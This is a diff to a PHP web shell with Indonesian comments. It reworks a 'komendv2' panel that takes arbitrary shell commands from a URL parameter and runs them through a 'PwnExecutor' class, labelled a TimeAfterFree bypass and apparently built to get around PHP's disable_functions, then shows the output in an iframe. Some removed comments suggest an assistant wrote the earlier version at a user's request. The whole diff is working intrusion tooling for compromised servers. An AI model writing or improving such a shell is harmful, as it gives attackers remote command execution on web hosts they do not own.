@@ -142,21 +142,8 @@ function setfilename(val)
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
-//@set_time_limit(0);
-//@error_reporting(0);
-//@http_response_code(404);
 
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-$disfunc = @ini_get("disable_functions");
-if (empty($disfunc)) {
-    $disf = "<font color='gold'>NONE</font>";
-} else {
-    $disf = "<font color='red'>".$disfunc."</font>";
-}
-
+// ========== PWN BYPASS UNTUK CMDV2 (TimeAfterFree) ==========
 class LoggerPwn
 {
     private static $logging = false;
@@ -311,14 +298,20 @@ class PwnExecutor
         } while ($f_entry !== 0);
     }
 }
+// ========== AKHIR PWN ==========
+//@set_time_limit(0);
+//@error_reporting(0);
+//@http_response_code(404);
 
-function runPwnCommand($cmd, $workdir = null) {
-    if ($workdir && is_dir($workdir)) {
-        chdir($workdir);
-    }
-    $output_file = __DIR__ . '/output.txt';
-    $full_cmd = "({$cmd}) > " . escapeshellarg($output_file) . " 2>&1";
-    new PwnExecutor($full_cmd);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+$disfunc = @ini_get("disable_functions");
+if (empty($disfunc)) {
+    $disf = "<font color='gold'>NONE</font>";
+} else {
+    $disf = "<font color='red'>".$disfunc."</font>";
 }
 
 function author() {
@@ -665,51 +658,51 @@ Upload File From Link :<br>
     }
     echo "</center>";
 } elseif (isset($_GET['komendv2'])) {
-    $output_file = __DIR__ . '/output.txt';
     $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    $output_file = __DIR__ . '/output.txt';
     echo "<center>";
-    echo '<form method="get" action="" onsubmit="return runCmdV2(event)">
+    echo '<form method="get" action="" onsubmit="return false;" id="pwnForm">
             <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
             <input type="hidden" name="komendv2" value="gaskan">
-            <input type="text" name="run_cmd" placeholder="ls -la" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
-            <button type="submit" class="up" style="cursor:pointer;">>></button>
+            <span>'.@get_current_user().'@'.ipserv().':~ $</span>
+            <input type="text" name="run_cmd" id="pwnCmd" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
+            <button type="button" onclick="executePwn()" class="up" style="cursor:pointer;">>></button>
           </form>
-          <iframe id="pwnIframe" src="?show_output=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
+          <iframe id="pwnResult" src="?show_output=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
           <script>
-            function runCmdV2(e) {
-                e.preventDefault();
-                var cmd = document.querySelector("input[name=run_cmd]").value;
-                if(!cmd) return false;
-                var path = document.querySelector("input[name=path]").value;
-                fetch("?run_command=" + encodeURIComponent(cmd) + "&path=" + encodeURIComponent(path))
-                  .then(() => {
-                     document.getElementById("pwnIframe").src = "?show_output=1&path=" + encodeURIComponent(path) + "&t=" + Date.now();
-                  });
-                return false;
+            function executePwn() {
+                var cmd = document.getElementById("pwnCmd").value;
+                if(!cmd) return;
+                var path = document.getElementById("pwnForm").querySelector("input[name=path]").value;
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "?run_command=" + encodeURIComponent(cmd) + "&path=" + encodeURIComponent(path), true);
+                xhr.onload = function() {
+                    document.getElementById("pwnResult").src = "?show_output=1&path=" + encodeURIComponent(path) + "&t=" + new Date().getTime();
+                };
+                xhr.send();
             }
           </script>';
     echo "</center>";
-    // Tidak ada exit, biarkan script lanjut ke file listing? Tapi biar rapi, kita bisa skip file listing dengan mengatur variabel, namun lebih mudah: exit agar tidak lanjut. Tapi kamu minta tanpa exit, jadi kita lanjutkan saja. 
-    // Tapi agar tidak menampilkan file listing di halaman ini, kita bisa set variabel penanda dan di bagian bawah nanti if skip. Atau terima saja.
-    // Sesuai pola menu lain: setelah menampilkan konten menu, script tetap menampilkan file listing (kecuali ada die). Jadi kita biarkan saja.
+    // Biarkan tanpa exit agar tetap menampilkan file list di bawah (opsional)
 } elseif (isset($_GET['run_command'])) {
-    // Eksekusi perintah via Pwn
     $cmd = $_GET['run_command'];
     $workdir = isset($_GET['path']) ? $_GET['path'] : null;
-    if ($workdir && is_dir($workdir)) chdir($workdir);
+    if ($workdir && is_dir($workdir)) {
+        chdir($workdir);
+    }
     $output_file = __DIR__ . '/output.txt';
     $full_cmd = "({$cmd}) > " . escapeshellarg($output_file) . " 2>&1";
     new PwnExecutor($full_cmd);
-    exit; // exit karena ini request fetch, tidak perlu lanjut
+    exit;
 } elseif (isset($_GET['show_output'])) {
     $output_file = __DIR__ . '/output.txt';
     if (file_exists($output_file)) {
         header('Content-Type: text/plain; charset=utf-8');
         readfile($output_file);
     } else {
-        echo "No output yet.";
+        echo "No output yet. Jalankan perintah terlebih dahulu.";
     }
-    exit; // exit karena iframe request
+    exit;
 }
 
 if (!is_readable($lokasi)) {
